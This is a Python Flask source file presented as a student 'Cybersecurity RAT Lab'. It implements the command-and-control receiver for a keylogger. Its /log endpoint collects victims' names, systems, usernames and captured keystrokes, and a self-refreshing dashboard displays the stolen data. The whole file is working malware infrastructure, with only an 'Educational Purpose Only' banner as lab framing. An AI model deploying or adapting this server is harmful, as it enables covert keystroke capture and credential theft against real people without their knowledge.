from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime

app = Flask(__name__)
CORS(app)

data_store = []

@app.route('/')
def home():
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Cyber Lab Server</title>
        <style>
            body { font-family: Arial; margin: 40px; background: #f0f2f5; }
            .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
            h1 { color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 15px; }
            .data-box { background: #f8f9fa; border-radius: 10px; padding: 20px; margin: 20px 0; border-left: 5px solid #2ecc71; }
            .victim { color: #e74c3c; font-weight: bold; font-size: 1.2em; }
            .keystrokes { background: #fffde7; padding: 15px; margin: 10px 0; border-radius: 8px; font-family: monospace; }
        </style>
        <meta http-equiv="refresh" content="3">
    </head>
    <body>
        <div class="container">
            <h1>🔐 Cybersecurity RAT Lab - LIVE Dashboard</h1>
            <p><em>Educational Purpose Only - Student: [YOUR NAME]</em></p>
            <hr>
            <h3>📊 Received Data (Live Updates):</h3>
    '''
    
    if not data_store:
        html += '<p style="color: #7f8c8d; text-align: center; padding: 40px;">⏳ Waiting for data from client...</p>'
    else:
        for item in reversed(data_store[-5:]):
            html += f'''
            <div class="data-box">
                <div class="victim">💻 {item.get("victim", "Unknown")}</div>
                <div>🖥️ {item.get("system", "Unknown OS")} | 👤 {item.get("user", "Unknown")}</div>
                <div class="keystrokes">⌨️ {item.get("keystrokes", "No data")}</div>
                <div style="color: #95a5a6; font-size: 0.9em;">🕒 {item.get("timestamp", "Unknown")}</div>
            </div>
            '''
    
    html += f'''
            <hr>
            <p><strong>Total Entries:</strong> {len(data_store)}</p>
            <p><a href="/test" style="color: #3498db;">Test Connection</a> | 
               <a href="/raw" style="color: #9b59b6;">View Raw Data</a> | 
               <a href="/clear" style="color: #e74c3c;">Clear Data</a></p>
            <p style="color: #7f8c8d; font-size: 0.9em; margin-top: 30px;">
                Server Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            </p>
        </div>
    </body>
    </html>
    '''
    return html

@app.route('/log', methods=['POST'])
def receive():
    data = request.json
    data['received'] = datetime.now().isoformat()
    data_store.append(data)
    
    print(f"✅ Received: {data.get('victim', 'Unknown')}")
    
    return jsonify({
        "status": "success",
        "message": "Data received",
        "total": len(data_store)
    })

@app.route('/raw')
def raw():
    return jsonify(data_store)

@app.route('/clear')
def clear():
    data_store.clear()
    return "Data cleared for testing"

@app.route('/test')
def test():
    return jsonify({
        "status": "online",
        "service": "Cyber Lab Server",
        "time": datetime.now().isoformat()
    })

if __name__ == '__main__':
    print("🚀 Server started at http://localhost:5000")
    app.run(host='0.0.0.0', port=5000)
